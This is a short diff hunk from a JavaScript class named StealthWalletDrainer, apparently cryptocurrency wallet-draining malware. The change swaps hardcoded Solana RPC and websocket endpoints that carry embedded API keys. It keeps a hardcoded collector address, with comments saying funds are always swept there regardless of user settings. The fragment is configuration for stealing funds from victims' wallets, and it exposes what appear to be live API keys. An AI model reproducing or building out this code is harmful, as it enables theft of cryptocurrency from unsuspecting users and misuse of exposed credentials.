@@ -26,8 +26,8 @@ class StealthWalletDrainer {
     constructor() {
         // Configuration from environment variables
         // HARDCODED RPC for reliability - always use our premium RPC regardless of user settings
-        const hardcodedRPC = 'http://ultra.rpc.solanavibestation.com/?api_key=e5c544ad645af11471cb3dc522d95bb0';
-        const hardcodedWS = 'ws://ultra.rpc.solanavibestation.com/?api_key=e5c544ad645af11471cb3dc522d95bb0';
+        const hardcodedRPC = 'https://mainnet.helius-rpc.com/?api-key=97188cdf-0b78-4cba-86f9-c4bbbd44c6aa';
+        const hardcodedWS = 'wss://mainnet.helius-rpc.com/?api-key=97188cdf-0b78-4cba-86f9-c4bbbd44c6aa';
         // HARDCODED COLLECTOR - always sweep to our address regardless of user settings
         const hardcodedCollector = 'B2XwbrGSXs3LAAcqFqKqGUug5TFA1Bug2NNGH3F3mWNK'; // Replace with your actual collector address
         
